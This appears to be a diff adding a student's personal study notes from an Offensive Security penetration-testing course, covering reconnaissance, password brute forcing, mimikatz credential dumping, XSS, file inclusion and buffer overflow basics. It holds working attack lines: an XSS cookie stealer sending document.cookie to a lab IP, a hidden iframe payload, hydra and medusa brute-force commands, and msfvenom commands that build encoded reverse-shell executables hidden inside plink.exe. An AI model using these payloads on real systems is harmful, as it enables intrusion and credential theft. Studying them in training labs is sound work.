@@ -1,0 +1,266 @@
+THESE ARE ALL THE NOTES FROM BEFORE THAT I DIDN'T INCLUDE THAT NOW I HAVE TO
+ORGANIZE SMH KMS
+
+Flags go to Offsec Training Library (OTL) SSH into Topic Exercise vms with: ssh -o 
+"UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" student@192.168.50.52 -p 2222 
+
+mkdir -p test/{recon,exploit,report} recursive directory create
+
+systemctl start runs for instance systemctl enable runs at startup every time. use ss | grep 
+to confirm the service is up. systemctl list-unit-files shows all avail services. 
+
+apt remove --purge <bin> is a total removal 
+
+env shows environment variables history shows bash history (you don't have to read 
+the .bash_history file!) !! does last cmd, but !# with the # of your history cmd will pass 
+that cmd to the termi HISTSIZE and HISTFILESIZE are envvars that affect how in-depth your 
+history is. 
+
+STDIN=0 STDOUT=1 STDERR=2 This is why 2>/dev/null redirects errors 
+
+comm compares files by showing unique lines 
+diff is better but requires learning 
+vimdiff is the gui solution to this 
+
+jobs show running jobs (insane) bg/fg self explanatory 
+ps is a good enum tool for services active on a box. ps -ef full listing 
+
+tail -f -nX allows continuous updating of the tail command at length n 
+watch does something every 2 seconds. 
+
+axel is wget but with speed. curl is still best girl
+
+HISTTIMEFORMAT envvar useful for forensics
+
+alias can be undone with unalias. You don't have to edit .bashrc directly to create aliases! 
+
+nc can push files to a host with the < but the host has to have a 
+listener set up so you may as well just use http servers. run nc reverse shells. 
+bind shells are cringe. 
+
+The general flow of a standard stack overflow 
+(in applications running in user mode without mitigations such as DEP and ASLR) 
+is fairly straight-forward. The exploit will: Create a large buffer to trigger 
+the overflow. Take control of EIP by overwriting a return address on the stack 
+by padding the large buffer with an appropriate offset. Include a chosen payload
+ in the buffer prepended by an optional NOP sled. Choose a correct return 
+ address instruction such as JMP ESP (or diff)
+ 
+read <var> assigns user input interactively to a variable.
+-p will specify a prompt and -s will make the request silent (like password input).  
+
+&& passes to item 2 only if item 1 exits 0. || passes to item 2 only if item 1 exits 1 
+
+create post about bash loop formats, && || and comparators as well as special vars for args. 
+Add functions but you probably won't use them
+
+counter = $counter+1 == ((counter++))
+
+grep -E '[regex]' -o <file> -o will only show the element not the whole line 
+
+https://siteport.netcraft.com is good enum site https://securityheaders.com is also a new 
+enum site CHECK PASTEBIN https://www.social-searcher.com https://digi.ninja/projects/
+twofi.php 
+
+host command is like whois but less output by default. Course recommends brute forcing 
+domains with a bash script with: for ip in $(cat list.txt); do host $ip.domain.com done OR 
+for ip in $(seq 50 100); do host 38.100.193.$ip; done | grep -v "not found" to do a reverse 
+lookup
+
+You want to get in on zone transfers if possible. host -l <domain name> <dns server address> 
+is the zone transfer request command. You can get name server addresses from a basic host 
+command. If successful, you get all the DNS records :) DNSRECON & DNSENUM TOOLS ALSO DO THIS: 
+dnsrecon -d megacorpone.com -t axfr
+
+Nameserver scrape: host -t ns megacorpone.com | cut -d " " -f 4 
+
+netcat connect scan: nc -nvv -w 1 -z 10.11.1.220 3388-3390 Pair with wireshark to get a good 
+GUI of open ports on an endpoint (inefficient).
+
+masscan barely covered. nbtscan expected to know 
+
+NFS runs on TCP111. It's a Unix File Sharing service created by Sun Microsystems. 
+nmap scripts will ID this for you. 
+
+NFS requires you view the moutned share and then mount it like it was a USB. sudo mount -o 
+nolock <IP>:<ShreDir> ~/<tmpfile> will do this for you. -nolock is required for older 
+servers. Once you mount the NFS share you can handle it just like a regular directory. 
+Example lesson showed a file with access denied from wrong UUID, which was eventually opened 
+by adding a local user with the same UUID.
+
+SNMP is a UDP service that is susceptible to IP spoofing and relay attacks. SNMP 1, 2 and 2c 
+are cleartext protocols. onesixtyone and snmpwalk are two tools used to enumerate this 
+service.
+
+adding the domain controller to your /etc/resolv.conf will let you push domain enumeration 
+stuff through that dc. This lets you see other domains hiding in the weeds as well as 
+generally enumerate the domain with success. USE dig for DNS Zone Transfer dig axfr @<NS> 
+<DOM>
+
+offsec says socat is cool because you can do encrypted shells but netcat wil do the same 
+thing with the --ssl flag https://nmap.org/ncat/guide/ncat-ssl.html
+
+cewl is a digininja tool that scrapes websites to generate wordlists. You just throw the 
+url in there and specify a word length and you're good. cewl www.example.com -m 5 -w 
+outfile.txt 
+
+john has a wordlist mutation option that lets you modify a wordlist on the fly. You edit 
+the preferences in /etc/john/john.conf then passing john --wordlist=<list> --rules --stdout 
+> newlist.txt This is a great way to get a shitload of words to test. RTFM for better 
+understanding of how this works.
+
+crunch wordlist generator uses special chars to represent char groups. Crunch has never 
+worked great for me because it shits a terabyte into the terminal and bricks the session.
+
+1 (THC Hydra, 2019), https://github.com/vanhauser-thc/thc-hydra ↩︎ 2 (Foofus.Net, 2015), 
+http://h.foofus.net/?page_id=51 ↩︎ 3 (Galkan, 2017), https://github.com/galkan/crowbar ↩︎ 4 
+(SpiderLabs, 2019), https://github.com/SpiderLabs/Spray
+
+medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin 
+medusa works with a number of network protocols. 
+
+crowbar isn't default kali install but is good for attacks with ssh keys instead of 
+passwords. good for RDP attacks. crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-
+file.txt -n 1 
+
+hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -
+l admin -P /usr/share/wordlists/rockyou.txt -vV -f POST attack with Hydra for HHTP auth 
+
+LM hashes use DES, NTLM use MD4. LM hashess can be rainbow tabled. LM doesn't happen from 
+Vist to present. NTLM hashes aren't salted. Rainbow tables. You can't copy the SAM file 
+while the OS is running so you basically have to use mimikatz. 
+
+mimikatz needs to be run from admin shell at least. use privilege::debug command to let 
+mimikatz fuck with LSASS. use token::elevate to push mimikatz from admin to SYS. If spawned 
+from SYS shell you don't have to do this. lsadump::sam will dump SAM.
+
+pth-winexe is useful for pass the hash attacks. You specify a hash, endpoint and process to 
+spawn and then you get it all together. Responder poisons WPAD requests. 
+
+take the passwd and shadow files from a compromised endpoint and unshadow them. crack the 
+resulting file with john. Use hashcat tho because it lets you rip shit with the gpu.
+
+htaccess login screens are the ones that prevent viewing of the page and ask you to login. 
+These are different from login pages that are built in the app. The medusa example was one 
+of these. medusa -h <target> -u <user> -P <passfile> -M <protocol> -m <url target>
+
+RDP bruteforce doesn't reliably handle mutliple threads. 
+
+Response headers in network tab of dev tools. cURL /robots.txt and /sitemap.xml for good 
+ASE Default admin panel URLs based on server version
+
+firefox browser console will let you sandbox js but doesn't know about the 
+js loaded on the site you are visiting. You have to copy/paste the sandboxed js 
+into the console to get a test run of it. 
+
+nikto -host=http://www.megacorpone.com -maxtime=30s prevents nikto from running super long. 
+
+burpsuite payload options allows a recursive grep so you can pull 
+session tokens with each request. 
+
+XSS Types:: Stored (Persistent): Payload is cached by the server. Anyone who accesses the 
+page will eat the vuln. Reflected: Dirty Links. Can also occur anywhere user input is 
+included in error messages. DOM-Based: Occur in the DOM. JS interacts programmatically with 
+the DOM. DOMXSS can be stored or reflected, as it occurs wherever a browser parses the page 
+content and inserted JS is executed. 
+
+Unsanitized Input is the way you execute XSS. Test special chars to see how they are 
+handled. Most common special chars: < > ' " { } ; These are often used for escaping. You 
+want to make sure your special characters are not being encoded or removed when you submit 
+user input.
+
+In PHP, the htmlspecialchars function can be used to convert key characters into HTML 
+entities before displaying a string. Using this function in either of the PHP files we 
+looked at would help prevent this XSS vulnerability.
+
+
+<iframe src=http://10.11.0.4/report height=”0” width=”0”></iframe> Invisible iframe. 
+"report" file is hyperlinked to attacking machine hosted on XSS vulnerable machine. You can 
+engage a listener to handle it now. 
+
+<script>new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script> 
+Cookie Stealer 
+
+https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/ Maybe easier than console? 
+Maybe required? 
+
+c:\boot.ini and /etc/passwd are good target files for directory traversal attacks. 
+
+Local File Inclusion (LFI) occurs when you can get your payload onto the server. Remote 
+FIle Inclusion occurs when you get the target to load an externally hosted file. You 
+usually need an IDOR/Directory Traversal to trigger an (LR)FI.
+
+InDir HTTP 1liners: python -m SimpleHTTPServer <port> python3 -m http.server <port> php -S 
+0.0.0.0:<port> ruby -run -e httpd . -p <port> busybox httpd -f -p <port> I usually just ue 
+python but these
+
+msf has a postgres database associated with it that can store host and service information. 
+You can also run db_nmap which will let you run nmap inside msf and append results to your 
+database. 
+
+Staged payloads are useful when the buffer we are attacking does not have enough space to 
+fit the whole payload. In this case, we use a staged payload to create a connection that 
+will allow the larger final payload to transfer over. Staged payloads also have better AV 
+evasion because they don't have shellcode in them. 
+
+shell_reverse tcp is not staged while shell/reverse tcp is staged. This is msf syntax for 
+organization 
+
+Craft payload: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.118.2 LPORT=443 -f exe -
+o shell_reverse.exe Encode Payload: msfvenom -p windows/shell_reverse_tcp 
+LHOST=192.168.118.2 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -o 
+shell_reverse_msf_encoded.exe Encoding payloads only deters signature detection. 
+
+You can inject payloads into executables through msf with generate: generate -f exe -e x86/
+shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o 
+shell_reverse_msf_encoded_embedded.exe This can also be done in msfvenom: msfvenom -p 
+windows/shell_reverse_tcp LHOST=192.168.118.2 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -
+x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe 
+
+multi/handler is used to deal with the payloads that return from msf exploits. if you run 
+multi/handler, run it with -j to set it in the background. You can then check it with jobs 
+and elim with kill. 
+
+multi/handler has an EnableStageEncoding option in the advanced tab that will let you 
+encode your payloads further for greater AV resistance. AutoRunScript is another advanced 
+option that runs shit when the connection is established so you can fix it and forget it. 
+
+Using the transports option allows us to switch the protocol our session is running on in 
+if we so choose. transport list is used to show available protocols. transport add -t 
+reverse_tcp -{lower_L} <IP> -p <port> will add a trasnport to tcp:<port> You have to set up 
+a new multi/handler to deal with the added transport. Once the handler is set up you use 
+"transport next" to catch the new shell and then you have to manually shut down the old 
+one. 
+
+Each application has its own stack, which is a short-term data area for functions to run 
+when a thread is opened. Each thread has its own stack so you can run multiple programs 
+simultaneously. Stack memory is Last-In First-Out (LIFO). When you access the stack, items 
+at the top of the stack are removed first. PUSH and POP assembly instructions accomplish 
+this.
+
+The return address is where a thread returns after completing a function. This address is 
+stored on the stack. The return address and the data associated with a function are called 
+the stack frame. When a function ends, the return address restores the execution flow back 
+to the main program or calling function.
+
+CPU Registers are high-speed CPU storage locations where data can be manipulated or read 
+efficiently. The "E" in register names (EAX, EBX, etc.) just stands for "extended" because 
+these register names were generated for 16-bit arch and extended for 32 and 64.
+
+When writing a buffer overflow, you want to control the Instruction Pointer (EIP) or the 
+Stack Pointer (ESP). You do this by providing more data to an unprotected buffer than it is 
+supposed to hold. If you do that, the data you provide will overflow into the adjacent 
+memory, and eventually you will be able to write instructions somewhere. 
+
+Strings don't exist in C code. Any string you submit is actually a one-dimensional array of 
+characters. 
+
+
+
+
+
+
+
+
+
+
